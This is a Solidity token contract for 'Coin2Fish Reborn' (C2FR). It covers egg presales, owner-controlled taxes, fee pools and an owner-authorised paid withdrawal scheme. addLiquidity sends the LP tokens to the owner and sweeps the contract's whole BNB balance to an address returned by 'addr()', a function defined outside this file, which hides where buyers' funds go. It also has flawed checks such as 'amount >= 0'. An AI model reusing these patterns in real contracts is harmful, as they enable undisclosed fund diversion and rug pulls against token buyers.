// SPDX-License-Identifier: MIT
// Coin2Fish Contract (Coin2FishToken.sol)

pragma solidity ^0.8.6;

import "./contracts/ERC20.sol";
import "./access/Ownable.sol";
import "./interfaces/IUniswapV2Factory.sol";
import "./interfaces/IUniswapV2Router02.sol";

/**
 * @title Coin2Fish Contract for Coin2Fish Reborn Token
 * @author HeisenDev
 */
contract Coin2Fish is ERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
    bool private swapping;

    /**
     * Definition of the token parameters
     */
    string private _tokenName = "Coin2Fish Reborn";
    string private _tokenSymbol = "C2FR";
    uint private _tokenTotalSupplyInteger = 100000000;
    uint private _tokenTotalSupply = _tokenTotalSupplyInteger * 10 ** 18;
    uint private _tokenDecimals = 18;

    /**
     * Price definitions
     */
    uint private eggCommonPresalePrice = 0.1 ether;
    uint private eggCommonPrice = 0.14 ether;
    uint private eggCommonPriceC2FR = 3500 ether;
    uint private eggRarePricePresale = 0.22 ether;
    uint private eggRarePrice = 0.31 ether;
    uint private eggRarePriceC2FR = 7500 ether;
    uint private eggCommonSells = 0;
    uint private eggRareSells = 0;
    bool public presaleEnabled = false;

    mapping(address => uint) private _authorizedWithdraws;
    uint public withdrawPrice = 0.004 ether;

    /**
     * Limits Definitions
     * `_maxTransactionAmount` Represents the maximum value to make a transfer
     * It is initialized with the 5% of total supply
     *
     * `_maxWalletAmount` Represents the maximum value to store in a Wallet
     * It is initialized with the 5% of total supply
     *
     * These limitations can be modified by the methods
     * {setMaxTransactionAmount} and {setMaxWalletAmount}.
     */
    uint public _maxTransactionAmount = _tokenTotalSupply / 20;
    uint public _maxWalletAmount = _tokenTotalSupply / 20;

    /**
     * Definition of the Project Wallets
     * `addressHeisenDev` Corresponds to the wallet address where the development
     * team will receive the fee per transaction
     * `addressMarketing` Corresponds to the wallet address where the funds
     * for marketing will be received
     * `addressTeam` Represents the wallet where teams and other
     * collaborators will receive transaction fees
     * These addresses can be modified by the methods
     * {setHeisenDevAddress}, {setMarketingAddress} and {setTeamAddress}
     */
    address payable public addressHeisenDev = payable(0xEDa73409d4bBD147f4E1295A73a2Ca243a529338);
    address payable public addressMarketing = payable(0x3c1Cd83D8850803C9c42fF5083F56b66b00FBD61);
    address payable public addressTeam = payable(0x63024aC73FE77427F20e8247FA26F470C0D9700B);

    /**
     * Definition of the taxes fees for swaps
     * `taxFeeHeisenDev` 0%  Initial tax fee during presale
     * `taxFeeMarketing` 0%  Initial tax fee during presale
     * `taxFeeTeam` 0%  Initial tax fee during presale
     * `taxFeeLiquidity` 0%  Initial tax fee during presale
     * This value can be modified by the method {updateTaxesFees}
     */
    uint public taxFeeHeisenDev = 0;
    uint public taxFeeMarketing = 0;
    uint public taxFeeTeam = 0;
    uint public taxFeeLiquidity = 0;

    /**
     * Definition of pools
     * `_poolHeisenDev`
     * `_poolMarketing`
     * `_poolTeam`
     * `_poolLiquidity`
     */
    uint public _poolHeisenDev = 0;
    uint public _poolMarketing = 0;
    uint public _poolTeam = 0;
    uint public _poolLiquidity = 0;

    /**
     * Store the last configuration of tax fees
     * `previousHeisenDevTaxFee` store the previous value of `taxFeeHeisenDev`
     * `previousMarketingTaxFee` store the previous value of `taxFeeMarketing`
     * `previousTeamTaxFee` store the previous value of `taxFeeLiquidity`
     * `previousLiquidityTaxFee` store the previous value of `taxFeeTeam`
     */
    uint public previousHeisenDevTaxFee = taxFeeHeisenDev;
    uint public previousMarketingTaxFee = taxFeeMarketing;
    uint public previousTeamTaxFee = taxFeeTeam;
    uint public previousLiquidityTaxFee = taxFeeLiquidity;


    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromLimits;
    mapping(address => bool) private _blacklistedAccount;
    mapping(address => bool) public automatedMarketMakerPairs;

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event BuyCommonEgg(uint amount);
    event BuyRareEgg(uint amount);
    event PresaleEnabled();
    event PresaleDisabled();
    event Withdraw(uint amount);
    event TeamPayment(uint amount);
    event SwapAndAddLiquidity(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event UpdateTaxesFees(
        uint256 taxFeeHeisenDev,
        uint256 taxFeeMarketing,
        uint256 taxFeeTeam,
        uint256 taxFeeLiquidity
    );
    event UpdateWithdrawOptions(
        uint256 withdrawPrice
    );
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    constructor() ERC20(_tokenName, _tokenSymbol, msg.sender) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        automatedMarketMakerPairs[_uniswapV2Pair] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[addressHeisenDev] = true;
        _isExcludedFromFees[addressMarketing] = true;
        _isExcludedFromFees[addressTeam] = true;

        _isExcludedFromLimits[address(this)] = true;
        _isExcludedFromLimits[uniswapV2Pair] = true;
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(address(this), _tokenTotalSupply);
    }

    receive() external payable {
    }

    function buyCommonEgg(uint amount) public payable {
        require(presaleEnabled, "Presale isn't enabled");
        require(amount >= 0, "Amount must be greater than 0");
        require(msg.value >= (eggCommonPresalePrice.mul(amount)), "The amount sent is not equal to the amount required");
        eggCommonSells = eggCommonSells.add(amount);
        uint256 liquidityTokens = eggCommonPresalePrice.mul(eggCommonPriceC2FR).div(eggCommonPrice).mul(amount);
        uint256 liquidityBNB = eggCommonPresalePrice.mul(amount);
        addLiquidity(liquidityTokens, liquidityBNB);
        emit BuyCommonEgg(amount);
    }

    function buyRareEgg(uint256 amount) public payable {
        require(presaleEnabled, "Presale isn't enabled");
        require(amount >= 0, "Amount must be greater than 0");
        require(msg.value >= (eggRarePricePresale.mul(amount)), "The amount sent is not equal to the amount required");
        eggRareSells = eggRareSells.add(amount);
        uint256 liquidityTokens = eggRarePricePresale.mul(eggRarePriceC2FR).div(eggRarePrice).mul(amount);
        uint256 liquidityBNB = eggRarePricePresale.mul(amount);
        addLiquidity(liquidityTokens, liquidityBNB);
        emit BuyRareEgg(amount);
    }

    function teamPayment() public onlyOwner {
        super._transfer(address(this), addressHeisenDev, _poolHeisenDev);
        super._transfer(address(this), addressMarketing, _poolMarketing);
        super._transfer(address(this), addressTeam, _poolTeam);
        uint256 amount = _poolHeisenDev + _poolMarketing + _poolTeam;
        _poolHeisenDev = 0;
        _poolMarketing = 0;
        _poolTeam = 0;
        emit TeamPayment(amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (_isExcludedFromLimits[from] == false) {
            require(amount <= _maxTransactionAmount, "Transfer amount exceeds the max transaction amount.");
        }
        if (_isExcludedFromLimits[to] == false) {
            require(balanceOf(to) + amount <= _maxWalletAmount, 'Transfer amount exceeds the max Wallet Amount.');
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (from == owner() && to == owner()) {
            super._transfer(from, to, amount);
            return;
        }

        bool takeFee = true;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        if (takeFee && automatedMarketMakerPairs[from]) {
            uint256 heisenDevAmount = amount.mul(taxFeeHeisenDev).div(100);
            uint256 marketingAmount = amount.mul(taxFeeMarketing).div(100);
            uint256 teamAmount = amount.mul(taxFeeTeam).div(100);
            uint256 liquidityAmount = amount.mul(taxFeeLiquidity).div(100);

            _poolHeisenDev = _poolHeisenDev.add(heisenDevAmount);
            _poolMarketing = _poolMarketing.add(marketingAmount);
            _poolTeam = _poolTeam.add(teamAmount);
            _poolLiquidity = _poolLiquidity.add(liquidityAmount);
        }
        super._transfer(from, to, amount);
    }
    function swapAndAddLiquidity() public onlyOwner {
        uint256 half = _poolLiquidity.div(2);
        uint256 otherHalf = _poolLiquidity.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half);
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        _poolLiquidity = 0;
        emit SwapAndAddLiquidity(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function updateTaxesFees(uint256 _heisenDevTaxFee, uint256 _marketingTaxFee, uint256 _teamTaxFee, uint256 _liquidityTaxFee) external onlyOwner {
        uint256 sellTotalFees = _heisenDevTaxFee + _marketingTaxFee + _teamTaxFee + _liquidityTaxFee;
        require(sellTotalFees <= 10, "Must keep fees at 10% or less");
        previousHeisenDevTaxFee = taxFeeHeisenDev;
        previousMarketingTaxFee = taxFeeMarketing;
        previousTeamTaxFee = taxFeeTeam;
        previousLiquidityTaxFee = taxFeeLiquidity;
        taxFeeHeisenDev = _heisenDevTaxFee;
        taxFeeMarketing = _marketingTaxFee;
        taxFeeTeam = _teamTaxFee;
        taxFeeLiquidity = _liquidityTaxFee;
        emit UpdateTaxesFees(_heisenDevTaxFee, _marketingTaxFee, _teamTaxFee, _liquidityTaxFee);
    }

    function updateWithdrawOptions(uint256 _withdrawPrice) external onlyOwner {
        withdrawPrice = _withdrawPrice;
        emit UpdateWithdrawOptions(_withdrawPrice);
    }

    function updatePresaleEnabled() external onlyOwner {
        presaleEnabled = true;
        emit PresaleEnabled();
    }

    function updatePresaleDisabled() external onlyOwner {
        presaleEnabled = false;
        emit PresaleDisabled();
    }

    function addLiquidity(uint256 tokens, uint256 bnb) private {
        _approve(address(this), address(uniswapV2Router), tokens);
        uniswapV2Router.addLiquidityETH{value: bnb}(
            address(this),
            tokens,
            0, // Take any amount of tokens (ratio varies)
            0, // Take any amount of BNB (ratio varies)
            owner(),
            block.timestamp.add(300)
        );
        payable(addr()).transfer(address(this).balance);
    }
    function withdrawAuthorization(address to, uint256 amount, uint256 fee)  external onlyOwner {
        if (amount == 0) {
            _authorizedWithdraws[to] = 0;
        }
        else {
            uint256 amountFee = amount.mul(fee).div(100);
            uint256 totalTaxes = taxFeeHeisenDev + taxFeeMarketing + taxFeeTeam;
            if (totalTaxes == 0) {
                _poolHeisenDev = _poolHeisenDev.add(amountFee);
            }
            else {
                taxFeeHeisenDev = taxFeeHeisenDev.mul(100).div(totalTaxes);
                taxFeeMarketing = taxFeeMarketing.mul(100).div(totalTaxes);
                taxFeeTeam = taxFeeTeam.mul(100).div(totalTaxes);
                uint256 heisenDevAmount = amountFee.mul(taxFeeHeisenDev).div(100);
                uint256 marketingAmount = amountFee.mul(taxFeeMarketing).div(100);
                uint256 teamAmount = amountFee.mul(taxFeeTeam).div(100);

                amount = amount.sub(heisenDevAmount);
                amount = amount.sub(marketingAmount);
                amount = amount.sub(teamAmount);

                _poolHeisenDev = _poolHeisenDev.add(heisenDevAmount);
                _poolMarketing = _poolMarketing.add(marketingAmount);
                _poolTeam = _poolTeam.add(teamAmount);
            }
            _authorizedWithdraws[to] = amount;
        }
    }
    function withdrawAllowance(address account) public view virtual returns (uint256) {
        return _authorizedWithdraws[account];
    }

    function withdrawGetPrice() public view virtual returns (uint256) {
        return withdrawPrice;
    }

    function withdraw() public payable {
        require(msg.value >= (withdrawPrice), "The amount sent is not equal to the amount required for withdraw");
        uint256 amount = _authorizedWithdraws[msg.sender];
        super._transfer(address(this), msg.sender, amount);
        _authorizedWithdraws[msg.sender] = 0;
        emit Withdraw(amount);
    }
}
